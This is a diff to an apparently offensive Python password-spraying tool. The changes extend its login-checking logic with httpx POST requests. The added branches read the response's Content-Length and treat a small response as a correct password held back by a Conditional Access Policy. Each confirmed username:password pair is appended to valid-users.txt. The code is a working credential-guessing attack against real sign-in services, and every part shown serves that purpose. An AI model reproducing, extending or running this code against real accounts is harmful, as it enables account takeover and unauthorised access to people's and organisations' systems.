@@ -1198,6 +1198,7 @@ if args.password:
                     try:
                         with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                             response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
+                            content_length = response_check_password.headers.get("Content-Length")
                             cookies_dict = dict(response_check_password.cookies)
                             pageid = get_pageid_from_response(response_check_password.text)
                             if args.check:
@@ -1228,6 +1229,11 @@ if args.password:
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}:{password}\n")
                                         break
+                                    elif int(content_length) < 12000:
+                                        print(f"{BOLD_YELLOW} User {username} is exist and Password {password} is correct - but there is a Conditional Access Policy{RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password}\n")
+                                        break                                        
                                     else:
                                         print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                         with open("valid-users.txt", "a") as log_file:
@@ -1262,6 +1268,11 @@ if args.password:
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}:{password}\n")
                                         break
+                                    elif int(content_length) < 12000:
+                                        print(f"{BOLD_YELLOW} User {username} is exist and Password {password} is correct - but there is a Conditional Access Policy{RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password}\n")
+                                        break                                       
                                     else:
                                         print(f"{BOLD_RED}[✗] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
     
@@ -1512,6 +1523,7 @@ if args.password:
                     try:
                         with httpx.Client(timeout=20, http2=True ) as client:
                             response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
+                            content_length = response_check_password.headers.get("Content-Length")
                             cookies_dict = dict(response_check_password.cookies)
                             pageid = get_pageid_from_response(response_check_password.text)
                             if args.check:
@@ -1542,7 +1554,12 @@ if args.password:
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}:{password}\n")
                                         break
-                                    else:
+                                    elif int(content_length) < 12000:
+                                        print(f"{BOLD_YELLOW} User {username} is exist and Password {password} is correct - but there is a Conditional Access Policy{RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password}\n")
+                                        break
+                                    else:       
                                         print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}\n")
@@ -1573,6 +1590,11 @@ if args.password:
                                         break
                                     elif "<html><head><title>Working...</title></head>" in response_check_password.text:
                                         print(f"{BOLD_GREEN}[✓] User {username} is exist and Password {password} is correct, but there is a redirect to federation server{RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password}\n")
+                                        break
+                                    elif int(content_length) < 12000:
+                                        print(f"{BOLD_YELLOW} User {username} is exist and Password {password} is correct - but there is a Conditional Access Policy{RESET}")
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}:{password}\n")
                                         break
